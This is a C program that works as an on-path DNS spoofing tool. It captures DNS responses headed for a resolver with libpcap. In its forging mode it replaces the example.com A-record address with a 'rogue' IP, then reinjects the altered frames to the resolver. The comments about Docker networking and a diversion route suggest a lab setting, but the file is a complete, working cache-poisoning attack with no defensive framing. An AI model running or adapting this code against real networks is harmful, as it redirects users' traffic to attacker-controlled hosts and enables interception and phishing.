#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <net/if.h>
#include <pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define IFACE "eth0"
#define RESOLVER_IP "172.16.2.10"
#define TARGET_NAME "example.com"
#define ROGUE_IP "172.16.1.30"

struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t udp_length;
};

static uint16_t checksum(const void *data, size_t len){
    const uint8_t *p = data;
    uint32_t sum = 0;

    while (len > 1) {
        sum += ((uint16_t)p[0] << 8) | p[1];
        p += 2;
        len -= 2;
    }

    if (len)
        sum += (uint16_t)p[0] << 8;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return htons((uint16_t)(~sum));
}

static int skip_dns_name(const uint8_t *msg, size_t len, size_t *offset){
    size_t p = *offset;

    while (p < len) {
        uint8_t n = msg[p];

        if ((n & 0xc0) == 0xc0) {
            if (p + 1 >= len)
                return -1;
            *offset = p + 2;
            return 0;
        }

        if (n & 0xc0)
            return -1;

        p++;
        if (n == 0) {
            *offset = p;
            return 0;
        }

        if (p + n > len)
            return -1;

        p += n;
    }

    return -1;
}

static int decode_dns_name(const uint8_t *msg, size_t len, size_t *offset, char *out, size_t out_size){
    size_t p = *offset, consumed = 0, used = 0;
    int jumped = 0;
    unsigned int hops = 0;

    while (p < len && hops++ < 128) {
        uint8_t n = msg[p];

        if ((n & 0xc0) == 0xc0) {
            if (p + 1 >= len)
                return -1;

            size_t ptr = ((size_t)(n & 0x3f) << 8) | msg[p + 1];

            if (ptr >= len)
                return -1;

            if (!jumped)
                consumed += 2;

            p = ptr;
            jumped = 1;
            continue;
        }

        if (n & 0xc0)
            return -1;

        p++;

        if (!jumped)
            consumed++;

        if (n == 0)
            break;

        if (p + n > len)
            return -1;

        if (used && used + 1 < out_size)
            out[used++] = '.';

        for (unsigned int i = 0; i < n; i++) {
            if (used + 1 >= out_size)
                return -1;

            out[used++] = (char)tolower((unsigned char)msg[p + i]);
        }

        p += n;

        if (!jumped)
            consumed += n;
    }

    if (hops >= 128 || used >= out_size)
        return -1;

    out[used] = '\0';
    *offset += consumed;
    return 0;
}

/* Return 1 if the question is example.com A; otherwise return 0. */
static int is_target_question(const uint8_t *dns, size_t len){
    if (len < 12)
        return 0;

    uint16_t flags = ((uint16_t)dns[2] << 8) | dns[3];
    uint16_t qdcount = ((uint16_t)dns[4] << 8) | dns[5];

    if (!(flags & 0x8000) || qdcount == 0)
        return 0;

    size_t off = 12;
    char qname[256];

    if (decode_dns_name(dns, len, &off, qname, sizeof(qname)) < 0)
        return 0;

    if (off + 4 > len)
        return 0;

    uint16_t qtype = ((uint16_t)dns[off] << 8) | dns[off + 1];

    return strcmp(qname, TARGET_NAME) == 0 && qtype == 1;
}

/*
 * Replace the A-record RDATA for target answer.
 * Returns 1 if at least one record was changed, 0 otherwise.
 */
static int forge_target_answer(uint8_t *dns, size_t len, uint16_t txid)
{
    if (!is_target_question(dns, len))
        return 0;

    uint16_t qdcount = ((uint16_t)dns[4] << 8) | dns[5];
    uint16_t ancount = ((uint16_t)dns[6] << 8) | dns[7];

    size_t off = 12;

    for (uint16_t i = 0; i < qdcount; i++) {
        if (skip_dns_name(dns, len, &off) < 0 || off + 4 > len)
            return 0;
        off += 4;
    }

    struct in_addr rogue;
    if (inet_pton(AF_INET, ROGUE_IP, &rogue) != 1)
        return 0;

    int forged = 0;

    for (uint16_t i = 0; i < ancount; i++) {
        if (skip_dns_name(dns, len, &off) < 0 || off + 10 > len)
            return forged;

        uint16_t type = ((uint16_t)dns[off] << 8) | dns[off + 1];
        uint16_t class_code =
            ((uint16_t)dns[off + 2] << 8) | dns[off + 3];
        uint16_t rdlength =
            ((uint16_t)dns[off + 8] << 8) | dns[off + 9];

        off += 10;

        if (off + rdlength > len)
            return forged;

        if (type == 1 && class_code == 1 && rdlength == 4) {
            char old_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, dns + off, old_ip, sizeof(old_ip));

            memcpy(dns + off, &rogue.s_addr, 4);

            printf("[FORGED] (TXID 0x%04x) %s A: %s -> %s\n",
                   txid, TARGET_NAME, old_ip, ROGUE_IP);
            forged = 1;
        }

        off += rdlength;
    }

    return forged;
}

static uint16_t udp_checksum_ipv4(struct iphdr *ip, struct udphdr *udp, size_t udp_len) {
    size_t total = sizeof(struct pseudo_header) + udp_len;
    uint8_t *buf = calloc(1, total);

    if (!buf)
        return 0;

    struct pseudo_header ph;
    ph.src = ip->saddr;
    ph.dst = ip->daddr;
    ph.zero = 0;
    ph.protocol = IPPROTO_UDP;
    ph.udp_length = htons((uint16_t)udp_len);

    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), udp, udp_len);

    uint16_t result = checksum(buf, total);
    free(buf);

    /* A zero UDP checksum means "no checksum" in IPv4; avoid that here. */
    return result ? result : 0xffff;
}

static int get_interface_mac(const char *iface, uint8_t mac[6]) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return -1;

    struct ifreq req;
    memset(&req, 0, sizeof(req));
    snprintf(req.ifr_name, sizeof(req.ifr_name), "%s", iface);

    if (ioctl(fd, SIOCGIFHWADDR, &req) < 0) {
        close(fd);
        return -1;
    }

    memcpy(mac, req.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

static int get_resolver_mac(uint8_t mac[6]) {
    for (int attempt = 0; attempt < 5; attempt++) {
        /* Populate the neighbor/ARP cache first. */
        (void)system("ping -c 1 -W 1 " RESOLVER_IP " >/dev/null 2>&1");

        FILE *f = fopen("/proc/net/arp", "r");
        if (f) {
            char line[256];
            (void)fgets(line, sizeof(line), f); /* Skip header. */

            while (fgets(line, sizeof(line), f)) {
                char ip[32], hw[32], dev[32];
                unsigned int flags = 0;

                if (sscanf(line, "%31s %*s %x %31s %*s %31s",
                           ip, &flags, hw, dev) == 4 &&
                    strcmp(ip, RESOLVER_IP) == 0 &&
                    (flags & 0x2) &&
                    strcmp(dev, IFACE) == 0) {

                    unsigned int b[6];

                    if (sscanf(hw, "%x:%x:%x:%x:%x:%x",
                               &b[0], &b[1], &b[2],
                               &b[3], &b[4], &b[5]) == 6) {
                        for (int i = 0; i < 6; i++)
                            mac[i] = (uint8_t)b[i];

                        fclose(f);
                        return 0;
                    }
                }
            }
            fclose(f);
        }
        usleep(500000);
    }

    return -1;
}

int main(void) {
    const char *forge_env = getenv("FORGE");
    int forge_enabled = forge_env && strcmp(forge_env, "1") == 0;
    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t attacker_mac[6], resolver_mac[6];

    if (get_interface_mac(IFACE, attacker_mac) < 0) {
        perror("Could not get attacker interface MAC");
        return 1;
    }

    if (get_resolver_mac(resolver_mac) < 0) {
        fprintf(stderr, "Could not find resolver MAC in ARP cache.\n");
        fprintf(stderr, "Check that %s is reachable on %s.\n",
                RESOLVER_IP, IFACE);
        return 1;
    }

    char attacker_mac_text[18], resolver_mac_text[18];
    snprintf(attacker_mac_text, sizeof(attacker_mac_text),
             "%02x:%02x:%02x:%02x:%02x:%02x",
             attacker_mac[0], attacker_mac[1], attacker_mac[2],
             attacker_mac[3], attacker_mac[4], attacker_mac[5]);
    snprintf(resolver_mac_text, sizeof(resolver_mac_text),
             "%02x:%02x:%02x:%02x:%02x:%02x",
             resolver_mac[0], resolver_mac[1], resolver_mac[2],
             resolver_mac[3], resolver_mac[4], resolver_mac[5]);

    printf("Interface: %s\nAttacker MAC: %s\nResolver MAC: %s\n",
           IFACE, attacker_mac_text, resolver_mac_text);
    printf("Mode: %s\n",
           forge_enabled ? "FORGING ENABLED" : "TRANSPARENT RELAY");
    printf("Listening for DNS responses destined for %s...\n",
           RESOLVER_IP);
    fflush(stdout);

    /* Use 1 ms timeout for immediate delivery without kernel buffer lag */
    pcap_t *handle = pcap_open_live(IFACE, 65535, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }

    struct bpf_program filter;
    const char *filter_exp =
        "ip and udp and src port 53 and dst host " RESOLVER_IP;

    if (pcap_compile(handle, &filter, filter_exp, 1,
                     PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(handle, &filter) < 0) {
        fprintf(stderr, "pcap filter error: %s\n",
                pcap_geterr(handle));
        pcap_close(handle);
        return 1;
    }
    pcap_freecode(&filter);

    /* Avoid recapturing packets injected by this process. */
    (void)pcap_setdirection(handle, PCAP_D_IN);

    while (1) {
        struct pcap_pkthdr *header;
        const u_char *packet;

        int rc = pcap_next_ex(handle, &header, &packet);
        if (rc == 0)
            continue;
        if (rc == -1) {
            fprintf(stderr, "pcap read error: %s\n",
                    pcap_geterr(handle));
            break;
        }
        if (rc == -2)
            break;

        if (header->caplen < sizeof(struct ethhdr))
            continue;

        uint8_t *frame = malloc(header->caplen);
        if (!frame)
            continue;

        memcpy(frame, packet, header->caplen);

        struct ethhdr *eth = (struct ethhdr *)frame;

        /* Ignore frames transmitted by ourselves to prevent re-injection loops */
        if (memcmp(eth->h_source, attacker_mac, 6) == 0) {
            free(frame);
            continue;
        }

        if (ntohs(eth->h_proto) != ETH_P_IP) {
            free(frame);
            continue;
        }

        size_t ip_off = sizeof(struct ethhdr);
        if (header->caplen < ip_off + sizeof(struct iphdr)) {
            free(frame);
            continue;
        }

        struct iphdr *ip = (struct iphdr *)(frame + ip_off);
        if (ip->version != 4 || ip->ihl < 5 ||
            ip->protocol != IPPROTO_UDP) {
            free(frame);
            continue;
        }

        size_t ip_len = (size_t)ip->ihl * 4;
        size_t total_ip_len = ntohs(ip->tot_len);

        if (total_ip_len < ip_len + sizeof(struct udphdr) ||
            ip_off + total_ip_len > header->caplen) {
            free(frame);
            continue;
        }

        struct udphdr *udp =
            (struct udphdr *)(frame + ip_off + ip_len);
        size_t udp_len = ntohs(udp->len);

        if (udp_len < sizeof(struct udphdr) ||
            udp_len > total_ip_len - ip_len) {
            free(frame);
            continue;
        }

        uint8_t *dns = (uint8_t *)udp + sizeof(struct udphdr);
        size_t dns_len = udp_len - sizeof(struct udphdr);

        if (dns_len < 12) {
            free(frame);
            continue;
        }

        uint16_t txid = ((uint16_t)dns[0] << 8) | dns[1];
        int changed = forge_enabled ? forge_target_answer(dns, dns_len, txid) : 0;

        /*
         * Due to Docker veth checksum offloading, incoming packets from
         * authoritative nameservers carry partial/invalid hardware offload
         * checksums. When re-injecting raw Ethernet frames via libpcap,
         * the receiving resolver kernel validates the UDP checksum in software.
         * Setting udp->check = 0 tells the IPv4 UDP stack that no checksum
         * was computed (RFC 768), preventing kernel checksum drops.
         */
        udp->check = 0;

        /*
         * The router addressed the Ethernet frame to us because of
         * the diversion route. Forward it to the resolver while
         * preserving the IP addresses and UDP ports.
         */
        memcpy(eth->h_source, attacker_mac, 6);
        memcpy(eth->h_dest, resolver_mac, 6);

        if (pcap_inject(handle, frame, header->caplen) < 0) {
            fprintf(stderr, "pcap_inject: %s\n",
                    pcap_geterr(handle));
        } else if (!changed) {
            printf("[RELAY] (TXID 0x%04x) DNS response forwarded unchanged\n", txid);
        }

        free(frame);
        fflush(stdout);
    }

    pcap_close(handle);
    return 0;
}
